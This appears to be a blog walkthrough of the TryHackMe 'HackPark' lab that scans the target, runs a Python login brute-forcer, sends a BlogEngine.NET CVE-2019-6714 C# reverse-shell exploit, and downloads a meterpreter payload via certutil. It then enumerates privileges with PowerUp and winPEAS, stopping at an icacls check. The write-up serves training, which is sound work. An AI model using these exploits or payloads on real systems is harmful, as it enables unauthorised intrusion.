---
layout: page
title: HackPark
description: HackPark from TryHackMe.
img: 
importance: 3
category: TryHackMe
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/hackpark/logo.png" title="THM HackPark Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/hackpark">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Let's take a trip to the HackPark.  We all float down here!

First things first, run nmap to get a list of the services running on top ports.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$  sudo nmap -sC -sV -A -O -oN nmap -Pn 10.10.150.103
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 10:39 AEDT
Nmap scan report for 10.10.150.103
Host is up (0.27s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: hackpark | hackpark amusements
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2025-02-24T23:33:29
|_Not valid after:  2025-08-26T23:33:29
|_ssl-date: 2025-02-25T23:40:45+00:00; +25s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2025-02-25T23:40:40+00:00

<snip>
```
{% endraw %}

<br />
Try to run the vulnerability category of nmap scripts to find low hanging fruit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ sudo nmap --script vuln -oN vulnchk -Pn 10.10.150.103
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 10:39 AEDT
Nmap scan report for 10.10.150.103
Host is up (0.26s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.150.103
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.150.103:80/
|     Form id: aspnetform
|     Form action: /
|     
|     Path: http://10.10.150.103:80/category/BlogEngineNET
|     Form id: aspnetform
|     Form action: /category/BlogEngineNET
|     
|     Path: http://10.10.150.103:80/author/Admin
|     Form id: aspnetform
|     Form action: /author/Admin
|     
|     Path: http://10.10.150.103:80/Account/login.aspx?ReturnURL=/admin/
|     Form id: form1
|_    Form action: login.aspx?ReturnURL=%2fadmin%2f
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /calendar/cal_search.php: ExtCalendar
|   /robots.txt: Robots file
|   /calendar/cal_cat.php: Calendarix
|   /archive/: Potentially interesting folder
|   /archives/: Potentially interesting folder
|   /author/: Potentially interesting folder
|   /contact/: Potentially interesting folder
|   /contacts/: Potentially interesting folder
|   /search/: Potentially interesting folder
|_  /search-ui/: Potentially interesting folder
3389/tcp open  ms-wbt-server
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
|             Modulus Type: Safe prime
|             Modulus Source: RFC2409/Oakley Group 2
|             Modulus Length: 1024
|             Generator Length: 1024
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org

Nmap done: 1 IP address (1 host up) scanned in 754.51 seconds
```
{% endraw %}

<br />
Check the landing page the webserver is serving.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/hackpark/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
For totally hacking related reasons, research the clown in the picture.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/hackpark/wiki.png" title="Wikipedia" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://en.wikipedia.org/wiki/It_(character)">https://en.wikipedia.org/wiki/It_(character)</a>

<br />
Click on the hamburger button and select login to navigate to the login page.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/hackpark/menu.png" title="Menu Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try the hydra command that was given in the box description.  It doesn't seem to work.  Why is it only half the command?  I am so confused.  Regardless, I also tried other variations.  Couldn't get it to work...or got impatient.  Gave up.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.150.103 http-post-form    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-26 10:52:57
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[ERROR] the variables argument needs at least the strings ^USER^, ^PASS^, ^USER64^ or ^PASS64^: (null)
```
{% endraw %}

<br />
Try logging in on the form and view the request in the devtools.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/hackpark/devtools.png" title="Dev Tools" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Whip up a script to brute-force the login.  You can base this script on the request we captured earlier.

{% raw %}
```python
import requests
from bs4 import BeautifulSoup

url = 'http://10.10.150.103/Account/login.aspx'

with open('/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt','r') as fs:
    for line in fs:
        passwd = line.rstrip('\n')

        s = requests.Session()

        r1 = s.get(url=url)
        soup = BeautifulSoup(r1.text,'html.parser')

        viewstate = soup.find(attrs={"name":"__VIEWSTATE"})['value']
        eventvalidation = soup.find(attrs={"name":"__EVENTVALIDATION"})['value']

        data = {'__VIEWSTATE':viewstate,
                '__EVENTVALIDATION':eventvalidation,
                'ctl00$MainContent$LoginUser$UserName':'admin',
                'ctl00$MainContent$LoginUser$Password':passwd,
                'ctl00$MainContent$LoginUser$LoginButton':'Log+in'}

        r2 = s.post(url=url,data=data)
        if 'Forgot your password' not in r2.text:
            print('admin:{passwd}'.format(passwd=passwd))
            break
```
{% endraw %}

<br />
Run the brute-forcer, we just wrote.  Jackpot!!

{% raw %}
```python
======== RESTART: /home/kali/Documents/thm/hackpark/thm-hackpark_0x00.py =======
admin:1qaz2wsx
```
{% endraw %}

<br />
You could also use Intruder, if you can't be bothered to do write your own.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/hackpark/intruder.png" title="Intruder Crack" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Test the credentials and see if they work.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/hackpark/dashboard.png" title="Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Get the blogengine.net version from the about section of the website.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/hackpark/version.png" title="Get The Version" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the exploit-db looking for something juicy for our version of BlogEngine.NET.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/hackpark/exploitdb.png" title="Exploit-DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the exploit and update the IP address and the port.  Make sure you name it PostView.ascx.

{% raw %}
```java
# Exploit Title: BlogEngine.NET <= 3.3.6 Directory Traversal RCE
# Date: 02-11-2019
# Exploit Author: Dustin Cobb
# Vendor Homepage: https://github.com/rxtur/BlogEngine.NET/
# Software Link: https://github.com/rxtur/BlogEngine.NET/releases/download/v3.3.6.0/3360.zip
# Version: <= 3.3.6
# Tested on: Windows 2016 Standard / IIS 10.0
# CVE : CVE-2019-6714

/*
 * CVE-2019-6714
 *
 * Path traversal vulnerability leading to remote code execution.  This 
 * vulnerability affects BlogEngine.NET versions 3.3.6 and below.  This 
 * is caused by an unchecked "theme" parameter that is used to override
 * the default theme for rendering blog pages.  The vulnerable code can 
 * be seen in this file:
 * 
 * /Custom/Controls/PostList.ascx.cs
 *
 * Attack:
 *
 * First, we set the TcpClient address and port within the method below to 
 * our attack host, who has a reverse tcp listener waiting for a connection.
 * Next, we upload this file through the file manager.  In the current (3.3.6)
 * version of BlogEngine, this is done by editing a post and clicking on the 
 * icon that looks like an open file in the toolbar.  Note that this file must
 * be uploaded as PostView.ascx. Once uploaded, the file will be in the
 * /App_Data/files directory off of the document root. The admin page that
 * allows upload is:
 *
 * http://10.10.10.10/admin/app/editor/editpost.cshtml
 *
 *
 * Finally, the vulnerability is triggered by accessing the base URL for the 
 * blog with a theme override specified like so:
 *
 * http://10.10.10.10/?theme=../../App_Data/files
 *
 */

<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
        static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

        using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.4.119.29", 443)) {
                using(System.IO.Stream stream = client.GetStream()) {
                        using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
                                streamWriter = new System.IO.StreamWriter(stream);

                                StringBuilder strInput = new StringBuilder();

                                System.Diagnostics.Process p = new System.Diagnostics.Process();
                                p.StartInfo.FileName = "cmd.exe";
                                p.StartInfo.CreateNoWindow = true;
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
                                p.Start();
                                p.BeginOutputReadLine();

                                while(true) {
                                        strInput.Append(rdr.ReadLine());
                                        p.StandardInput.WriteLine(strInput);
                                        strInput.Remove(0, strInput.Length);
                                }
                        }
                }
        }
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
        StringBuilder strOutput = new StringBuilder();

        if (!String.IsNullOrEmpty(outLine.Data)) {
                try {
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                } catch (Exception err) { }
        }
    }

</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ sudo nc -nlvp 443                          
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Request the appropriate link indicated in the exploit.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ curl 'https://10.10.150.103/?theme=../../App_Data/files'

```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ sudo nc -nlvp 443                          
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.150.103] 49350
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog

```
{% endraw %}

<br />
Generate an msfvenom executable with a meterpreter payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.119.29 LPORT=4444 -f exe -o meter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: meter.exe
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```
{% endraw %}

<br />
Transfer to the victim machine.

{% raw %}
```bash
c:\windows\system32\inetsrv>cd C:\Windows\Temp
pwd
C:\Windows\Temp>pwd
certutil.exe -urlcache -f http://10.4.119.29:8000/meter.exe meter.exe
C:\Windows\Temp>certutil.exe -urlcache -f http://10.4.119.29:8000/meter.exe meter.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
{% endraw %}

<br />
Set a multi/handler listener in msfconsole.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ msfconsole -q                                                                               
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.4.119.29:4444
```
{% endraw %}

<br />
Execute the meterpreter payload.

{% raw %}
```bash
.\meter.exe
C:\Windows\Temp>.\meter.exe
```
{% endraw %}

<br />
Check the handler and catch the session.

{% raw %}
```bash
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.4.119.29:4444 
[*] Sending stage (177734 bytes) to 10.10.150.103
[*] Meterpreter session 1 opened (10.4.119.29:4444 -> 10.10.150.103:49368) at 2025-02-26 12:50:27 +1100

meterpreter >
```
{% endraw %}

<br />
Run the systeminfo command to figure out what system that we are on.  Note, the Original Install Date.

{% raw %}
```bash
C:\Windows\Temp>systeminfo
systeminfo

Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA886
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          2/25/2025, 3:32:32 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,096 MB
Available Physical Memory: 3,129 MB
Virtual Memory: Max Size:  5,504 MB
Virtual Memory: Available: 4,417 MB
Virtual Memory: In Use:    1,087 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 8 Hotfix(s) Installed.
                           [01]: KB2919355
                           [02]: KB2919442
                           [03]: KB2937220
                           [04]: KB2938772
                           [05]: KB2939471
                           [06]: KB2949621
                           [07]: KB3035131
                           [08]: KB3060716
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.150.103
                                 [02]: fe80::1503:f867:23c8:fae9
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
{% endraw %}

<br />
Run sysinfo in the meterpreter session.

{% raw %}
```bash
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```
{% endraw %}

<br />
Download PowerUp.ps1 to the attack machine.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ curl https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -o PowerUp.ps1 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  586k  100  586k    0     0  1084k      0 --:--:-- --:--:-- --:--:-- 1086k
```
{% endraw %}

<br />
Load the PowerShell extension in the meterpreter session.

{% raw %}
```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS >
```
{% endraw %}

<br />
Run all of the checks.

{% raw %}
```bash
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 1488
ProcessId   : 1412
Name        : 1412
Check       : Process Token Privileges

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
C
ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
NCheck          : Unquoted Service Paths

ServiceName                     : WindowsScheduler
Path                            : C:\PROGRA~2\SYSTEM~1\WService.exe
ModifiableFile                  : C:\PROGRA~2\SYSTEM~1\WService.exe
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'WindowsScheduler'
CanRestart                      : False
Name                            : WindowsScheduler
Check                           : Modifiable Service Files

Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WScheduler
Path           : C:\PROGRA~2\SYSTEM~1\WScheduler.exe /LOGON
ModifiableFile : @{ModifiablePath=C:\PROGRA~2\SYSTEM~1\WScheduler.exe; IdentityReference=Everyone;
                 Permissions=System.Object[]}
Name           : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WScheduler
Check          : Modifiable Registry Autorun

Key            : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\WScheduler
Path           : C:\PROGRA~2\SYSTEM~1\WScheduler.exe /LOGON
ModifiableFile : @{ModifiablePath=C:\PROGRA~2\SYSTEM~1\WScheduler.exe; IdentityReference=Everyone;
 Name           : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\WScheduler
Check          : Modifiable Registry Autorun
```
{% endraw %}

<br />
Check the privs for our user.

{% raw %}
```bash
PS > whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
{% endraw %}

<br />
Load incognito and list all of the tokens.

{% raw %}
```bash
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization

Impersonation Tokens Available
========================================
No tokens available
```
{% endraw %}

<br />
Download winpeas.exe.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/winPEASx64.exe -O winpeas.exe                 
--2025-02-26 14:03:08--  https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/winPEASx64.exe
Resolving github.com (github.com)... 140.82.113.4
Connecting to github.com (github.com)|140.82.113.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/f059e642-3b1b-4f26-86a2-0ff7e9e1748d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250226%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250226T030338Z&X-Amz-Expires=300&X-Amz-Signature=c4bcf5dd554d81332245a43266760f74ad6103774d369ffa80837e3b9351eb38&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DwinPEASx64.exe&response-content-type=application%2Foctet-stream [following]
--2025-02-26 14:03:09--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/f059e642-3b1b-4f26-86a2-0ff7e9e1748d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250226%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250226T030338Z&X-Amz-Expires=300&X-Amz-Signature=c4bcf5dd554d81332245a43266760f74ad6103774d369ffa80837e3b9351eb38&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DwinPEASx64.exe&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10142720 (9.7M) [application/octet-stream]
Saving to: ‘winpeas.exe’

winpeas.exe                                                100%[========================================================================================================================================>]   9.67M  3.13MB/s    in 3.1s    

2025-02-26 14:03:13 (3.13 MB/s) - ‘winpeas.exe’ saved [10142720/10142720]
```
{% endraw %}

<br />
Upload it to the victim machine.

{% raw %}
```bash
meterpreter > upload winpeas.exe
[*] Uploading  : /home/kali/Documents/thm/hackpark/winpeas.exe -> winpeas.exe
[*] Uploaded 8.00 MiB of 9.67 MiB (82.71%): /home/kali/Documents/thm/hackpark/winpeas.exe -> winpeas.exe
[*] Uploaded 9.67 MiB of 9.67 MiB (100.0%): /home/kali/Documents/thm/hackpark/winpeas.exe -> winpeas.exe
[*] Completed  : /home/kali/Documents/thm/hackpark/winpeas.exe -> winpeas.exe
```
{% endraw %}

<br />
Run it.  Notice the error at the end.

{% raw %}
```bash

<snip>

Unhandled Exception: System.MissingMethodException: Method not found: '!!0[] System.Array.Empty()'.
   at winPEAS.Checks.CloudInfo.PrintInfo(Boolean isDebug)
   at winPEAS.Checks.Checks.RunChecks(Boolean isAllChecks, Boolean wait, Boolean isNetworkScan)
   at winPEAS.Checks.Checks.<>c__DisplayClass32_0.<Run>b__1()
   at winPEAS.Helpers.CheckRunner.Run(Action action, Boolean isDebug, String description)
   at winPEAS.Checks.Checks.Run(String[] args)
   at winPEAS.Program.Main(String[] args)
```
{% endraw %}

<br />
Download winpeas.bat.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250320-91fb36a0/winPEAS.bat   
--2025-03-23 20:55:33--  https://github.com/peass-ng/PEASS-ng/releases/download/20250320-91fb36a0/winPEAS.bat
Resolving github.com (github.com)... 140.82.112.4
Connecting to github.com (github.com)|140.82.112.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/0f377321-c5b6-42d3-a866-c01eeded8777?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250323%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250323T095542Z&X-Amz-Expires=300&X-Amz-Signature=ce786dc05449aab49343114c0f75c74d10665a73ee3f5fec2a6b6d5b99b4b8d7&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DwinPEAS.bat&response-content-type=application%2Foctet-stream [following]
--2025-03-23 20:55:34--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/0f377321-c5b6-42d3-a866-c01eeded8777?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250323%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250323T095542Z&X-Amz-Expires=300&X-Amz-Signature=ce786dc05449aab49343114c0f75c74d10665a73ee3f5fec2a6b6d5b99b4b8d7&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DwinPEAS.bat&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 36950 (36K) [application/octet-stream]
Saving to: ‘winPEAS.bat’

winPEAS.bat                                                100%[========================================================================================================================================>]  36.08K  --.-KB/s    in 0.007s  

2025-03-23 20:55:35 (5.15 MB/s) - ‘winPEAS.bat’ saved [36950/36950]

┌──(kali㉿kali)-[~/Documents/thm/hackpark]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer to the victim machine and run it.  Note, the Original Install Time...again.

{% raw %}
```bash
C:\Windows\Temp>.\winPEAS.bat
.\winPEAS.bat

<snip>                                                                                                                                                                                                                               
[*] BASIC SYSTEM INFO                                                                                                                                                                                                                       
 [+] WINDOWS OS                                                                                                                                                                                                                             
   [i] Check for vulnerabilities for the OS version with the applied patches                                                                                                                                                                
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits                                                                                                                     
                                                                                                                                                                                                                                            
Host Name:                 HACKPARK                                                                                                                                                                                                         
OS Name:                   Microsoft Windows Server 2012 R2 Standard                                                                                                                                                                        
OS Version:                6.3.9600 N/A Build 9600                                                                                                                                                                                          
OS Manufacturer:           Microsoft Corporation                                                                                                                                                                                            
OS Configuration:          Standalone Server                                                                                                                                                                                                
OS Build Type:             Multiprocessor Free                                                                                                                                                                                              
Registered Owner:          Windows User                                                                                                                                                                                                     
Registered Organization:                                                                                                                                                                                                                    
Product ID:                00252-70000-00000-AA886                                                                                                                                                                                          
Original Install Date:     8/3/2019, 10:43:23 AM

<snip>
```
{% endraw %}

<br />
Run schtasks /query to try and view the tasks.

{% raw %}
```bash
C:\Windows\Temp>schtasks /query
schtasks /query

Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
INFO: There are no scheduled tasks presently available at your access level.

<snip>
```
{% endraw %}

<br />
Run schtasks /query /fo LIST /v to get all of the scheduled tasks with more detail.

{% raw %}
```bash
C:\Windows\Temp>schtasks /query /fo LIST /v
schtasks /query /fo LIST /v

Folder: \
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows
INFO: There are no scheduled tasks presently available at your access level.

<snip>
```
{% endraw %}

<br />
Get a list of service running and notice the WindowsScheduler service.  This is usually running some kind of service that we might be able to abuse.

{% raw %}
```bash
C:\Windows\Temp>powershell -c "Get-Service | Where-Object {$_.Status -eq \"Running\"}"
powershell -c "Get-Service | Where-Object {$_.Status -eq \"Running\"}"

Status   Name               DisplayName                           
------   ----               -----------                           

<snip>

Running  Wcmsvc             Windows Connection Manager            
Running  WindowsScheduler   System Scheduler Service              
Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
Running  Winmgmt            Windows Management Instrumentation    
Running  WinRM              Windows Remote Management (WS-Manag...
```
{% endraw %}

<br />
After heaps of research on where the logs where located (seriously...hours), change directory into the SystemScheduler\Events directory.

{% raw %}
```bash
C:\Windows\Temp>cd "C:\Program Files (x86)\SystemScheduler\Events
cd "C:\Program Files (x86)\SystemScheduler\Events

C:\Program Files (x86)\SystemScheduler\Events>
```
{% endraw %}

<br />
Type the file and view the contents to get what the sceduler has been trying to run.

{% raw %}
```bash
C:\Program Files (x86)\SystemScheduler\Events>type 20198415519.INI_LOG.txt
type 20198415519.INI_LOG.txt
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)

<snip>
```
{% endraw %}

<br />
Icacls the message binary from the parent folder of the events folder that we are currently in.  This should give use the permissions of the file.

{% raw %}
```bash
C:\Program Files (x86)\SystemScheduler>icacls Message.exe
icacls Message.exe
